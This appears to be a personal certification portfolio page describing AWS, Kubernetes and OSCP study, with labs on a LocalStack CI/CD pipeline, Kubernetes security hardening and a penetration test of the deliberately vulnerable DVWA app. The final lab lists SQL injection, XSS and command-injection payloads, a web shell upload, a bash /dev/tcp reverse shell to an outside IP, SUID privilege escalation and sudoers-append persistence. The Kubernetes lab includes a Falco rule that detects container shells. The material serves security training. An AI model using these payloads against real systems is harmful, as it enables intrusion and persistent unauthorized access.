AWS Solutions Architect Journey

AWS Certified Solutions Architect - Associate

Earned: March 2024

My Journey

My AWS certification journey started when I was working on a project that required migrating on-premises infrastructure to the cloud. I quickly realized that understanding AWS services at a deep level wasn't optional—it was essential for designing resilient, cost-effective solutions.

I spent 3 months preparing, combining hands-on labs with theoretical study. The key was building actual projects: deploying multi-tier applications, setting up VPCs with public/private subnets, implementing auto-scaling groups, and configuring S3 with CloudFront for static website hosting.

Key Projects I Built

1. High-Availability Web Application

Deployed a 3-tier web app with Application Load Balancer, EC2 Auto Scaling Groups across multiple AZs, RDS with Multi-AZ failover, and ElastiCache for session management.

2. Serverless Data Processing Pipeline

Built an event-driven architecture using S3, Lambda, DynamoDB, and SQS to process uploaded files asynchronously. Implemented dead-letter queues and CloudWatch alarms for monitoring.

3. Hybrid Cloud Network

Configured VPN connections between on-premises data center and AWS VPC, set up Direct Connect for low-latency connections, and implemented Transit Gateway for multi-VPC networking.

Certified Kubernetes Administrator Story

Certified Kubernetes Administrator (CKA)

Earned: June 2024

The Challenge

The CKA exam is notorious for being 100% hands-on—no multiple choice questions. You have 2 hours to solve 15-20 real-world Kubernetes problems in a command-line environment. This meant I couldn't just memorize theory; I needed muscle memory for kubectl commands and troubleshooting workflows.

I prepared for 4 months, spending at least 2 hours daily in my home lab. I built a 6-node cluster using kubeadm, broke things intentionally, and learned to fix them under time pressure.

OSCP: Try Harder Journey

Offensive Security Certified Professional (OSCP)

Earned: September 2024

The Most Challenging Certification

OSCP is not just an exam—it's a rite of passage in cybersecurity. The motto "Try Harder" isn't just a catchphrase; it's what you'll tell yourself at 3 AM when you've been stuck on a box for 6 hours.

The exam is a brutal 24-hour challenge where you must compromise multiple machines in an isolated network, escalate privileges, capture flags, and write a professional penetration testing report. I failed my first attempt—and that failure taught me more than any success ever could.

My Preparation Strategy

Phase 1: Fundamentals (2 months)
  • • Completed all PWK lab machines (50+ boxes)
  • • Mastered enumeration workflows (nmap, gobuster, enum4linux)
  • • Practiced buffer overflow exploits (stack-based BOF)
  • • Studied privilege escalation techniques (Linux & Windows)
Phase 2: Practice Platforms (3 months)
  • • HackTheBox: Rooted 40+ machines (TJ Null's OSCP list)
  • • Proving Grounds Practice: Completed all OSCP-like boxes
  • • VulnHub: Old classics like Kioptrix, SickOs, Stapler
Phase 3: Exam Simulation (1 month)
  • • Timed challenges mimicking exam conditions
  • • Report writing practice
  • • Note-taking with CherryTree and KeepNote

Hands-On: LocalStack CI/CD Pipeline

Project Overview

This project demonstrates how to build a complete CI/CD pipeline using LocalStack for local AWS development. The goal is to test infrastructure changes locally before deploying to production, saving costs and speeding up development cycles.

Architecture

┌─────────────────────────────────────────────┐
│         LocalStack CI/CD Pipeline            │
├─────────────────────────────────────────────┤
│                                             │
│  Git Push → GitHub Actions                  │
│      ↓                                      │
│  Terraform Plan (LocalStack)                │
│      ↓                                      │
│  Run Tests                                  │
│      ↓                                      │
│  Ansible Configure                          │
│      ↓                                      │
│  Deploy to LocalStack S3 + Lambda           │
│                                             │
└─────────────────────────────────────────────┘

Step 1: Setup LocalStack

# docker-compose.yml
version: '3.8'
services:
  localstack:
    image: localstack/localstack:latest
    ports:
      - "4566:4566"
    environment:
      - SERVICES=s3,lambda,dynamodb,apigateway
      - DEBUG=1
      - DATA_DIR=/tmp/localstack/data
    volumes:
      - "./localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"

# Start LocalStack
$ docker-compose up -d

# Verify services are running
$ awslocal s3 ls

Step 2: Infrastructure as Code (Terraform)

# main.tf
provider "aws" {
  region                      = "us-east-1"
  access_key                  = "test"
  secret_key                  = "test"
  skip_credentials_validation = true
  skip_metadata_api_check     = true
  skip_requesting_account_id  = true

  endpoints {
    s3      = "http://localhost:4566"
    lambda  = "http://localhost:4566"
  }
}

resource "aws_s3_bucket" "app_bucket" {
  bucket = "my-app-bucket"
}

resource "aws_lambda_function" "api" {
  filename      = "lambda.zip"
  function_name = "my-api-function"
  role          = aws_iam_role.lambda_role.arn
  handler       = "index.handler"
  runtime       = "nodejs18.x"
}

# Apply to LocalStack
$ terraform init
$ terraform plan
$ terraform apply

Step 3: Automated Testing

# test_infrastructure.py
import boto3
import pytest

@pytest.fixture
def s3_client():
    return boto3.client(
        's3',
        endpoint_url='http://localhost:4566',
        aws_access_key_id='test',
        aws_secret_access_key='test'
    )

def test_bucket_exists(s3_client):
    buckets = s3_client.list_buckets()
    bucket_names = [b['Name'] for b in buckets['Buckets']]
    assert 'my-app-bucket' in bucket_names

def test_lambda_invocation():
    lambda_client = boto3.client(
        'lambda',
        endpoint_url='http://localhost:4566',
        aws_access_key_id='test',
        aws_secret_access_key='test'
    )
    response = lambda_client.invoke(
        FunctionName='my-api-function',
        InvocationType='RequestResponse'
    )
    assert response['StatusCode'] == 200

# Run tests
$ pytest test_infrastructure.py -v

Step 4: CI/CD Pipeline (GitHub Actions)

# .github/workflows/cicd.yml
name: LocalStack CI/CD

on: [push]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Start LocalStack
        run: |
          docker-compose up -d
          sleep 10

      - name: Terraform Init & Apply
        run: |
          terraform init
          terraform apply -auto-approve

      - name: Run Tests
        run: |
          pip install pytest boto3
          pytest test_infrastructure.py

      - name: Teardown
        if: always()
        run: docker-compose down

Hands-On: Kubernetes Security Hardening

Lab Objective

Learn to secure a Kubernetes cluster from the ground up. This lab covers RBAC, Pod Security Standards, Network Policies, and runtime security monitoring—essential skills for production Kubernetes deployments.

1. RBAC: Least Privilege Access

# Create a service account for a developer
$ kubectl create serviceaccount developer-sa -n development

# Create a role with limited permissions
$ kubectl create role developer-role \
  --verb=get,list,watch \
  --resource=pods,services,deployments \
  -n development

# Bind the role to the service account
$ kubectl create rolebinding developer-binding \
  --role=developer-role \
  --serviceaccount=development:developer-sa \
  -n development

# Test permissions
$ kubectl auth can-i delete pods --as=system:serviceaccount:development:developer-sa -n development
# Output: no

2. Pod Security Standards

# Apply Pod Security Standard to namespace
$ kubectl label namespace production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted

# Secure pod manifest
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:1.0
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL

3. Network Policies

# Deny all ingress traffic by default
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-ingress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress

# Allow specific traffic only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
    - Ingress
  ingress:
    - from:
      - podSelector:
          matchLabels:
            app: frontend
      ports:
        - protocol: TCP
          port: 8080

4. Runtime Security with Falco

# Install Falco
$ helm repo add falcosecurity https://falcosecurity.github.io/charts
$ helm install falco falcosecurity/falco \
  --namespace falco-system \
  --create-namespace

# Custom Falco rule to detect shell in container
- rule: Shell spawned in container
  desc: Detect shell execution in container
  condition: >
    spawned_process and container and
    proc.name in (bash, sh, zsh)
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name image=%container.image.repository)
  priority: WARNING

# Check Falco alerts
$ kubectl logs -n falco-system -l app=falco -f
Security Checklist
  • ☑ RBAC configured with least privilege
  • ☑ Pod Security Standards enforced
  • ☑ Network policies deny-all by default
  • ☑ Runtime security monitoring active
  • ☑ Secrets encrypted at rest
  • ☑ API server audit logging enabled

Hands-On: Web App Penetration Testing

⚠ DISCLAIMER: This lab is for educational purposes only. Only perform penetration testing on systems you own or have explicit written permission to test. Unauthorized access is illegal.

Methodology

This walkthrough demonstrates a complete penetration testing engagement on a deliberately vulnerable web application (DVWA - Damn Vulnerable Web Application). We'll follow the OWASP Testing Guide methodology.

Phase 1: Reconnaissance

# Port scanning
$ nmap -sV -sC -p- target.local

# Web technology fingerprinting
$ whatweb http://target.local

# Directory enumeration
$ gobuster dir \
  -u http://target.local \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt

# Subdomain enumeration
$ subfinder -d target.local
$ amass enum -d target.local

Phase 2: Vulnerability Discovery

# SQL Injection Testing
# Payload: ' OR '1'='1
http://target.local/login.php?user=admin'%20OR%20'1'='1&pass=test

# XSS Testing
# Payload: 
http://target.local/search?q=

# Using SQLMap for automated SQL injection
$ sqlmap -u "http://target.local/product.php?id=1" \
  --dbs \
  --batch

# Command Injection
# Payload: ; whoami
http://target.local/ping.php?host=127.0.0.1;whoami

# File Upload Vulnerability
# Create malicious PHP file
$ echo '' > shell.php
# Upload and access: http://target.local/uploads/shell.php?cmd=id

Phase 3: Exploitation

# Establish reverse shell
# On attacker machine
$ nc -lvnp 4444

# On compromised server (via RCE)
$ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Privilege escalation enumeration
$ find / -perm -4000 -type f 2>/dev/null
$ sudo -l
$ cat /etc/crontab

# Exploit SUID binary
$ /usr/bin/find . -exec /bin/sh -p \; -quit

# Persistence
$ echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

OWASP Top 10 Coverage

A01: Broken Access Control

IDOR, missing function-level authorization

A02: Cryptographic Failures

Weak hashing, plaintext storage

A03: Injection

SQL injection, command injection, LDAP

A07: XSS

Reflected, stored, DOM-based XSS

Report Writing

A professional penetration test report should include: Executive Summary, Scope, Methodology, Detailed Findings (with CVSS scores), Evidence (screenshots/PoC), Remediation Recommendations, and an Appendix with technical details.
